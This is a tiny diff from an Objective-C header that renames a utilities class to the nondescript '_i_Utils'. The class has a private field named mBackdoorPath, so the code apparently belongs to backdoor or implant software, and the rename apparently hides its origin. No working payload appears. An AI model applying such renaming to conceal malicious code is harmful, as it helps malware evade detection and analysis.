@@ -13,7 +13,7 @@
 #define __RCSIUtils_h__
 
 
-@interface RCSIUtils : NSObject
+@interface _i_Utils : NSObject
 {
 @private
   NSString *mBackdoorPath;
